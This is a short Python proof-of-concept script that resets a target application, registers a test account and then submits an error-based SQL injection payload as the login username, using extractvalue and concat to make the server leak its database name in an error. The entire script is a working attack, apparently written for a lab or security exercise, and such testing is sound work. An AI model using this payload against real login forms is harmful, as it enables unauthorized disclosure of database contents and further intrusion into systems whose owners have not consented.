from poc_lib import *

r = reset()
print(r.status_code)

r = register("teste1", "teste1")
print(r.status_code)

r = login("\'or extractvalue(1,concat(0x7e,database())) or\'", "teste1")
print(r.text)